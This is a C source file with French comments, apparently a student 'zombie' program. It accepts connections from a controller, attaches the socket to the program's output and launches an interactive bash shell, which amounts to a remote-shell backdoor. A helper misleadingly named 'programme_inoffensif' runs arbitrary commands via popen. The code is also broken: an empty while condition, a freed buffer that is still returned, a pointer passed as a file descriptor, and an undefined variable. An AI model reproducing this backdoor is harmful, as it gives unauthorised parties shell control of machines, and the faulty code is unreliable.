#include <stdio.h>
#include <stdlib.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <unistd.h>
#include <string.h>

#include "utils_v2.h"
#include "info.h"
#include "reseau.h"

char* programme_inoffensif(char* commande) 
{
    char* rep = malloc(100 * sizeof(char));
    printf("%d porttt", PORTS[0]);
    printf("%d porttt", NUM_PORTS);
    FILE* fp = popen(commande, "r");
    if (fp == NULL) {
        perror("Erreur lors de l'exécution de la commande");
        return NULL;
    }
    // Lecture réponse 
    fgets(rep, 100, fp);

    // Suppression du caractère de saut de ligne à la fin de la réponse
    size_t len = strlen(rep);
    if (len > 0 && rep[len - 1] == '\n') {
        rep[len - 1] = '\0';
    }
    // Fermeture du flux de fichier
    pclose(fp);

    free(rep);
    return rep;
}

void run(void* sockfdController){
    while(){
        int* sockfd = sockfdController;
        dup2(sockfd, STDOUT_FILENO);
        dup2(sockfd, STDERR_FILENO);
        sexecl("/bin/bash", "bash", "-i", NULL);
        dup2(0,sockfd);
    }
}

int main(int argc, char *argv[]){
    int sockfd = initSocketZombie();

    int sockfdController;
    
    while(!end){
        // attend une connexion
        printf("En attente de connexion\n");
        sockfdController = saccept(sockfd);
        printf("Connexion établie\n");

        int pid_child = fork_and_run1(run, sockfdController);

    }

    sclose(sockfdController);
    return 0;
    
}